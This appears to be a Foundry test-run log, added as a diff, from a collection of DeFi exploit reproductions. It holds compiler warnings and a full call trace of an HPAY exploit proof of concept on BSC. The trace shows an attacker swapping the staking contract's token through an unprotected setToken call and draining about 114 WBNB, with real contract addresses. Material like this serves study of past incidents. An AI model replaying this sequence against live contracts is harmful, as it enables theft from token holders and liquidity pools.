@@ -1,0 +1,268 @@
+Compiling 28 files with Solc 0.8.25
+Solc 0.8.25 finished in 1.24s
+Compiler run successful with warnings:
+Warning (2519): This declaration shadows an existing declaration.
+   --> src/test/interface.sol:886:5:
+    |
+886 |     function WETH() external view returns (address);
+    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1598:5:
+     |
+1598 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1850:5:
+     |
+1850 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:2560:5:
+     |
+2560 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:3759:5:
+     |
+3759 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+
+Ran 1 test for script/Exploit-template_new.sol:ExploitScript
+[PASS] testExploit() (gas: 20485)
+Logs:
+  Attacker ETH Balance Before exploit: 0.000000000000000000
+  Attacker ETH Balance After exploit: 0.000000000000000000
+
+Traces:
+  [20485] ExploitScript::testExploit()
+    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 378.57ms (200.61µs CPU time)
+
+Ran 1 test for src/test/2022-10/HPAY_exp.sol:ContractTest
+[PASS] testExploit() (gas: 1391990)
+Logs:
+  [Start] Attacker WBNB balance before exploit: 0.000000000000000000
+  [End] Attacker WBNB balance after exploit: 114.433555702427267533
+
+Traces:
+  [1530190] ContractTest::testExploit()
+    ├─ [2534] WBNB_TOKEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_decimal_uint(key: "[Start] Attacker WBNB balance before exploit", val: 0, decimals: 18)
+    ├─ [25339] HPAY_TOKEN::approve(PS_ROUTER: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PS_ROUTER: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   └─ ← [Return] true
+    ├─ [424228] → new SHITCOIN@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 1783 bytes of code
+    ├─ [46628] SHITCOIN::mint(100000000000000000000000000 [1e26])
+    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 100000000000000000000000000 [1e26])
+    │   └─ ← [Stop] 
+    ├─ [17660] BONUS::setToken(SHITCOIN: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   ├─ [10487] BONUS_IMPL::setToken(SHITCOIN: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] 
+    ├─ [24523] SHITCOIN::approve(BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   └─ ← [Return] true
+    ├─ [541] SHITCOIN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 100000000000000000000000000 [1e26]
+    ├─ [206812] BONUS::stake(100000000000000000000000000 [1e26])
+    │   ├─ [206118] BONUS_IMPL::stake(100000000000000000000000000 [1e26]) [delegatecall]
+    │   │   ├─ [25614] SHITCOIN::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, 2000000000000000000000000 [2e24])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, value: 2000000000000000000000000 [2e24])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [25614] SHITCOIN::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], 98000000000000000000000000 [9.8e25])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], value: 98000000000000000000000000 [9.8e25])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit Stake(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 98000000000000000000000000 [9.8e25])
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] 
+    ├─ [0] VM::roll(22281853 [2.228e7])
+    │   └─ ← [Return] 
+    ├─ [1560] BONUS::setToken(HPAY_TOKEN: [0xC75aa1Fa199EaC5adaBC832eA4522Cff6dFd521A])
+    │   ├─ [887] BONUS_IMPL::setToken(HPAY_TOKEN: [0xC75aa1Fa199EaC5adaBC832eA4522Cff6dFd521A]) [delegatecall]
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] 
+    ├─ [403580] BONUS::withdraw(30000000000000000000000000 [3e25])
+    │   ├─ [402907] BONUS_IMPL::withdraw(30000000000000000000000000 [3e25]) [delegatecall]
+    │   │   ├─ [37274] HPAY_TOKEN::mint(BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], 1000878647941797139237 [1e21])
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], value: 1000878647941797139237 [1e21])
+    │   │   │   ├─ [12413] HPAY_RewardManager::notifyBalanceUpdate(BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], 30404629833794213789798633 [3.04e25])
+    │   │   │   │   ├─ [5216] HPAY_RewardManager_Impl::notifyBalanceUpdate(BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], 30404629833794213789798633 [3.04e25]) [delegatecall]
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Return] 
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [31049] HPAY_TOKEN::transfer(0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, 1000878647941797139237 [1e21])
+    │   │   │   ├─ emit Transfer(from: BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], to: 0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, value: 1000878647941797139237 [1e21])
+    │   │   │   ├─ [1913] HPAY_RewardManager::notifyBalanceUpdate(BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], 30405630712442155586937870 [3.04e25])
+    │   │   │   │   ├─ [1216] HPAY_RewardManager_Impl::notifyBalanceUpdate(BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], 30405630712442155586937870 [3.04e25]) [delegatecall]
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Return] 
+    │   │   │   ├─ [8305] HPAY_RewardManager::notifyBalanceUpdate(0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, 56163744873280578071739 [5.616e22])
+    │   │   │   │   ├─ [7608] HPAY_RewardManager_Impl::notifyBalanceUpdate(0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, 56163744873280578071739 [5.616e22]) [delegatecall]
+    │   │   │   │   │   ├─ [930] HPAY_TOKEN::balanceOf(0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 57164623521222375210976 [5.716e22]
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Return] 
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [17049] HPAY_TOKEN::transfer(0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, 600000000000000000000000 [6e23])
+    │   │   │   ├─ emit Transfer(from: BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], to: 0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, value: 600000000000000000000000 [6e23])
+    │   │   │   ├─ [1913] HPAY_RewardManager::notifyBalanceUpdate(BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], 30404629833794213789798633 [3.04e25])
+    │   │   │   │   ├─ [1216] HPAY_RewardManager_Impl::notifyBalanceUpdate(BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], 30404629833794213789798633 [3.04e25]) [delegatecall]
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Return] 
+    │   │   │   ├─ [4305] HPAY_RewardManager::notifyBalanceUpdate(0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, 57164623521222375210976 [5.716e22])
+    │   │   │   │   ├─ [3608] HPAY_RewardManager_Impl::notifyBalanceUpdate(0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, 57164623521222375210976 [5.716e22]) [delegatecall]
+    │   │   │   │   │   ├─ [930] HPAY_TOKEN::balanceOf(0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 657164623521222375210976 [6.571e23]
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Return] 
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [256392] HPAY_TOKEN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 29400000000000000000000000 [2.94e25])
+    │   │   │   ├─ emit Transfer(from: BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 29400000000000000000000000 [2.94e25])
+    │   │   │   ├─ [1913] HPAY_RewardManager::notifyBalanceUpdate(BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], 29804629833794213789798633 [2.98e25])
+    │   │   │   │   ├─ [1216] HPAY_RewardManager_Impl::notifyBalanceUpdate(BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], 29804629833794213789798633 [2.98e25]) [delegatecall]
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Return] 
+    │   │   │   ├─ [224548] HPAY_RewardManager::notifyBalanceUpdate(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   │   │   │   ├─ [223851] HPAY_RewardManager_Impl::notifyBalanceUpdate(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0) [delegatecall]
+    │   │   │   │   │   ├─ [930] HPAY_TOKEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 29400000000000000000000000 [2.94e25]
+    │   │   │   │   │   ├─ [2633] HPAY_Fund::pendingRewards() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000088900bc094dadd899
+    │   │   │   │   │   ├─ emit Deposit(dst: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 29400000000000000000000000 [2.94e25])
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Return] 
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit Unstake(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 29400000000000000000000000 [2.94e25])
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] 
+    ├─ [930] HPAY_TOKEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 29400000000000000000000000 [2.94e25]
+    ├─ [319658] PS_ROUTER::swapExactTokensForTokensSupportingFeeOnTransferTokens(29400000000000000000000000 [2.94e25], 0, [0xC75aa1Fa199EaC5adaBC832eA4522Cff6dFd521A, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1666090831 [1.666e9])
+    │   ├─ [242337] HPAY_TOKEN::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], WBNB_HPAY_PAIR: [0xa0A1E7571F938CC33daD497849F14A0c98B30FD0], 29400000000000000000000000 [2.94e25])
+    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: HPAY_TOKEN: [0xC75aa1Fa199EaC5adaBC832eA4522Cff6dFd521A], value: 1176000000000000000000000 [1.176e24])
+    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: WBNB_HPAY_PAIR: [0xa0A1E7571F938CC33daD497849F14A0c98B30FD0], value: 28224000000000000000000000 [2.822e25])
+    │   │   ├─ [17132] HPAY_RewardManager::notifyBalanceUpdate(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 29400000000000000000000000 [2.94e25])
+    │   │   │   ├─ [16435] HPAY_RewardManager_Impl::notifyBalanceUpdate(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 29400000000000000000000000 [2.94e25]) [delegatecall]
+    │   │   │   │   ├─ [930] HPAY_TOKEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [633] HPAY_Fund::pendingRewards() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000088900bc094dadd899
+    │   │   │   │   ├─ emit Withdraw(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 29400000000000000000000000 [2.94e25])
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   └─ ← [Return] 
+    │   │   ├─ [3913] HPAY_RewardManager::notifyBalanceUpdate(WBNB_HPAY_PAIR: [0xa0A1E7571F938CC33daD497849F14A0c98B30FD0], 38276009729219513316254676 [3.827e25])
+    │   │   │   ├─ [3216] HPAY_RewardManager_Impl::notifyBalanceUpdate(WBNB_HPAY_PAIR: [0xa0A1E7571F938CC33daD497849F14A0c98B30FD0], 38276009729219513316254676 [3.827e25]) [delegatecall]
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   └─ ← [Return] 
+    │   │   ├─ emit Transfer(from: HPAY_TOKEN: [0xC75aa1Fa199EaC5adaBC832eA4522Cff6dFd521A], to: 0xb1588cA2529fF4F1a8e21d6FE24bA6D0B6E000B0, value: 1188774321402739570559930 [1.188e24])
+    │   │   ├─ [162063] 0xb1588cA2529fF4F1a8e21d6FE24bA6D0B6E000B0::processFee()
+    │   │   │   ├─ [930] HPAY_TOKEN::balanceOf(0xb1588cA2529fF4F1a8e21d6FE24bA6D0B6E000B0) [staticcall]
+    │   │   │   │   └─ ← [Return] 1188774321402739570559930 [1.188e24]
+    │   │   │   ├─ [930] HPAY_TOKEN::balanceOf(0xb1588cA2529fF4F1a8e21d6FE24bA6D0B6E000B0) [staticcall]
+    │   │   │   │   └─ ← [Return] 1188774321402739570559930 [1.188e24]
+    │   │   │   ├─ [81739] HPAY_TOKEN::transfer(0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, 594387160701369785279965 [5.943e23])
+    │   │   │   │   ├─ emit Transfer(from: 0xb1588cA2529fF4F1a8e21d6FE24bA6D0B6E000B0, to: 0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, value: 594387160701369785279965 [5.943e23])
+    │   │   │   │   ├─ [8372] HPAY_RewardManager::notifyBalanceUpdate(0xb1588cA2529fF4F1a8e21d6FE24bA6D0B6E000B0, 1188774321402739570559930 [1.188e24])
+    │   │   │   │   │   ├─ [7675] HPAY_RewardManager_Impl::notifyBalanceUpdate(0xb1588cA2529fF4F1a8e21d6FE24bA6D0B6E000B0, 1188774321402739570559930 [1.188e24]) [delegatecall]
+    │   │   │   │   │   │   ├─ [930] HPAY_TOKEN::balanceOf(0xb1588cA2529fF4F1a8e21d6FE24bA6D0B6E000B0) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 594387160701369785279965 [5.943e23]
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   ├─ [63336] HPAY_RewardManager::notifyBalanceUpdate(0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, 657164623521222375210976 [6.571e23])
+    │   │   │   │   │   ├─ [62639] HPAY_RewardManager_Impl::notifyBalanceUpdate(0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, 657164623521222375210976 [6.571e23]) [delegatecall]
+    │   │   │   │   │   │   ├─ [930] HPAY_TOKEN::balanceOf(0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1251551784222592160490941 [1.251e24]
+    │   │   │   │   │   │   ├─ [633] HPAY_Fund::pendingRewards() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000088900bc094dadd899
+    │   │   │   │   │   │   ├─ emit Deposit(dst: 0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, wad: 1251551784222592160490941 [1.251e24])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [930] HPAY_TOKEN::balanceOf(0xb1588cA2529fF4F1a8e21d6FE24bA6D0B6E000B0) [staticcall]
+    │   │   │   │   └─ ← [Return] 594387160701369785279965 [5.943e23]
+    │   │   │   ├─ [61016] HPAY_TOKEN::transfer(0xc405c35ceC783C2ccc5430Dd13C2dbd18adCCd1c, 594387160701369785279965 [5.943e23])
+    │   │   │   │   ├─ emit Transfer(from: 0xb1588cA2529fF4F1a8e21d6FE24bA6D0B6E000B0, to: 0xc405c35ceC783C2ccc5430Dd13C2dbd18adCCd1c, value: 594387160701369785279965 [5.943e23])
+    │   │   │   │   ├─ [4372] HPAY_RewardManager::notifyBalanceUpdate(0xb1588cA2529fF4F1a8e21d6FE24bA6D0B6E000B0, 594387160701369785279965 [5.943e23])
+    │   │   │   │   │   ├─ [3675] HPAY_RewardManager_Impl::notifyBalanceUpdate(0xb1588cA2529fF4F1a8e21d6FE24bA6D0B6E000B0, 594387160701369785279965 [5.943e23]) [delegatecall]
+    │   │   │   │   │   │   ├─ [930] HPAY_TOKEN::balanceOf(0xb1588cA2529fF4F1a8e21d6FE24bA6D0B6E000B0) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   ├─ [43813] HPAY_RewardManager::notifyBalanceUpdate(0xc405c35ceC783C2ccc5430Dd13C2dbd18adCCd1c, 1465349323423145263642183 [1.465e24])
+    │   │   │   │   │   ├─ [43116] HPAY_RewardManager_Impl::notifyBalanceUpdate(0xc405c35ceC783C2ccc5430Dd13C2dbd18adCCd1c, 1465349323423145263642183 [1.465e24]) [delegatecall]
+    │   │   │   │   │   │   ├─ [930] HPAY_TOKEN::balanceOf(0xc405c35ceC783C2ccc5430Dd13C2dbd18adCCd1c) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 2059736484124515048922148 [2.059e24]
+    │   │   │   │   │   │   ├─ [633] HPAY_Fund::pendingRewards() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000088900bc094dadd899
+    │   │   │   │   │   │   ├─ emit Deposit(dst: 0xc405c35ceC783C2ccc5430Dd13C2dbd18adCCd1c, wad: 594387160701369785279965 [5.943e23])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PS_ROUTER: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640534639457584007913129639935 [1.157e77])
+    │   │   └─ ← [Return] true
+    │   ├─ [534] WBNB_TOKEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [2893] WBNB_HPAY_PAIR::getReserves() [staticcall]
+    │   │   └─ ← [Return] 270011697890923210138 [2.7e20], 38276009729219513316254676 [3.827e25], 1666090427 [1.666e9]
+    │   ├─ [930] HPAY_TOKEN::balanceOf(WBNB_HPAY_PAIR: [0xa0A1E7571F938CC33daD497849F14A0c98B30FD0]) [staticcall]
+    │   │   └─ ← [Return] 66500009729219513316254676 [6.65e25]
+    │   ├─ [62738] WBNB_HPAY_PAIR::swap(114433555702427267533 [1.144e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   ├─ [27962] WBNB_TOKEN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 114433555702427267533 [1.144e20])
+    │   │   │   ├─ emit Transfer(from: WBNB_HPAY_PAIR: [0xa0A1E7571F938CC33daD497849F14A0c98B30FD0], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 114433555702427267533 [1.144e20])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [534] WBNB_TOKEN::balanceOf(WBNB_HPAY_PAIR: [0xa0A1E7571F938CC33daD497849F14A0c98B30FD0]) [staticcall]
+    │   │   │   └─ ← [Return] 155578142188495942605 [1.555e20]
+    │   │   ├─ [930] HPAY_TOKEN::balanceOf(WBNB_HPAY_PAIR: [0xa0A1E7571F938CC33daD497849F14A0c98B30FD0]) [staticcall]
+    │   │   │   └─ ← [Return] 66500009729219513316254676 [6.65e25]
+    │   │   ├─ emit Sync(reserve0: 155578142188495942605 [1.555e20], reserve1: 66500009729219513316254676 [6.65e25])
+    │   │   ├─ emit Swap(sender: PS_ROUTER: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 28224000000000000000000000 [2.822e25], amount0Out: 114433555702427267533 [1.144e20], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   └─ ← [Stop] 
+    │   ├─ [534] WBNB_TOKEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   └─ ← [Return] 114433555702427267533 [1.144e20]
+    │   └─ ← [Stop] 
+    ├─ [534] WBNB_TOKEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 114433555702427267533 [1.144e20]
+    ├─ emit log_named_decimal_uint(key: "[End] Attacker WBNB balance after exploit", val: 114433555702427267533 [1.144e20], decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.07s (2.62s CPU time)
+
+Ran 2 test suites in 3.43s (3.45s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
